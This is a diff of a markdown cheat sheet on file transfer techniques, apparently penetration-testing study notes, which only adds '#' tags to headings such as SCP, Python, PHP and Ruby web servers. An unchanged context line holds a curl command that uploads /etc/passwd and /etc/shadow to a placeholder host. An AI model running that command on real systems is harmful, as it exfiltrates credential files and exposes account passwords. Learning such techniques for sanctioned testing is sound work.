@@ -42,11 +42,11 @@ Print the response
 cat <&3
 ```
 ## SSH downloads 
-Enable SSH Server 
+Enable #SSH Server 
 ```shell
 sudo systemctl enable ssh
 ```
-SCP
+#SCP
 ```shell
 scp <user>@<ip>:<link to file> <output> 
 ```
@@ -54,7 +54,7 @@ scp <user>@<ip>:<link to file> <output>
 
 # Uploads
 ### Method 1 
-Python web server 
+#Python web server 
 ```shell
 sudo python3 -m pip install --user uploadserver
 ```
@@ -74,19 +74,19 @@ curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
 ```
 ### Method 2 
 #### Alternate Web servers on host 
-Python3
+#Python3
 ```shell
 python3 -m http.server
 ```
-Python 2.7 
+#Python 2.7 
 ```shell
 python2.7 -m SimpleHTTPServer
 ```
-PHP
+#PHP
 ```shell
 php -S 0.0.0.0:8000
 ```
-Ruby 
+#Ruby 
 ```shell
 ruby -run -ehttpd . -p8000
 ```
